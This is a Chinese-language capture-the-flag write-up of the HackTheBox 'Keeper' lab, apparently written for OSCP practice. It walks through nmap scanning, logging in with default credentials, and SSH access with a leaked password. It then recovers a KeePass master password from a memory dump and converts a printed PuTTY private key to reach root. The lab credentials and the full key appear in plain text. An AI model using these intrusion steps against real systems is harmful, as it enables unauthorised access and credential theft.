---
title: "Keeper"
description: "这篇HackTheBox Linux 靶机 Keeper 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Keeper 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-09-12T23:22:18+08:00"
publishDate: "2024-09-12T23:22:18+08:00"
lastmod: "2024-09-12T23:22:18+08:00"
url: "/hackthebox/linux/keeper/"
image: "images/oscp-banners/banner-014.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对服务器进行端口扫描

```
sudo nmap -p- 10.10.11.227 -open
```

![image-20240912211223053](https://s2.loli.net/2024/09/12/26kSZ1pnfQPgW4o.png)

对开放端口进行一进步的服务探测

```
sudo nmap -p22,80 -A 10.10.11.227 -oX keeper.xml
```

![image-20240912211250130](https://s2.loli.net/2024/09/12/513D6VJmvgKsjQk.png)

22端口没有发现可以利用的漏洞，80端口访问优先进行hosts绑定

通过搜索漏洞和默认密码，得到以下信息

![image-20240912213457218](https://s2.loli.net/2024/09/12/gBAKSsLq2UNrRpE.png)

![image-20240912213510081](https://s2.loli.net/2024/09/12/rGMZ231gBc6UCov.png)

默认账号密码登录成功

通过子域名和路径爆破信息收集也没有进一步的结果

![image-20240912213610137](https://s2.loli.net/2024/09/12/R6yxseBq2QOkcNA.png)

![image-20240912213620389](https://s2.loli.net/2024/09/12/EYb43IJzB9OHD8X.png)

所以下一步继续在登录页面寻找路径

![image-20240912215611891](https://s2.loli.net/2024/09/12/xabkqY6N7OJclFj.png)

根据这个页面的提示，在burp中将referrer的内容进行替换

![image-20240912215643132](https://s2.loli.net/2024/09/12/rNXepAIfPWca79t.png)

![image-20240912220827106](https://s2.loli.net/2024/09/12/LDnGMXSIhlEueUg.png)

![image-20240912221712970](https://s2.loli.net/2024/09/12/PO8G61nplMxTYrS.png)

发现一个用户密码

考虑到22端口，是否是可以通过ssh登录

user:lnorgaard

password:Welcome2023!

![image-20240912222138289](https://s2.loli.net/2024/09/12/SFtZYluIdeJ2P6L.png)

成功突破边界，获取对应的flags

![image-20240912222305078](https://s2.loli.net/2024/09/12/uC5BFKw13o49Nyj.png)

采取一系列措施都没有效果，内核提权也失败，home目录下粗壮乃一个RT30000.zip，尝试下载分析

```
scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip /home/zkpc/Documents/hackthebox/keeper
```

![image-20240912225119781](https://s2.loli.net/2024/09/12/9iEDApa7tIumozV.png)

获取到这两个文件，Google搜索（https://github.com/vdohney/keepass-password-dumper）

```
dotnet.exe run ../KeePassDumpFull.dmp ../passcodes.kdbx
```

![image-20240912225813985](https://s2.loli.net/2024/09/12/HoOvDY7ARhF2zxW.png)

pass:dgrød med fløde

keepass是一个进程，上面dump出来的密码，需要用客户端来连接

网页：https://app.keeweb.info/

客户端：kpcli，https://keepass.info/download.html

使用web上传会显示文件损坏，重新解压一次即可，然后文件打开需要密码，输入上述密码会显示错误，通过Google搜索下，发现可能完全是rødgrød med *fløde* 

![image-20240912231055455](https://s2.loli.net/2024/09/12/SXVibq463s57wZK.png)

![image-20240912231210298](https://s2.loli.net/2024/09/12/syIlopD5FUaebhT.png)

成功进入

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

看着上述的内容很像ssh的密钥，但不是id_rsa格式，查找转换方法（https://medium.com/@arslion/convert-ppk-version-3-to-ssh-private-public-keys-pem-on-linux-ubuntu-4bf2c8db1ef2）

```
puttygen key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.227
```

![image-20240912232114464](https://s2.loli.net/2024/09/12/aVykf5I7S8TMqbt.png)

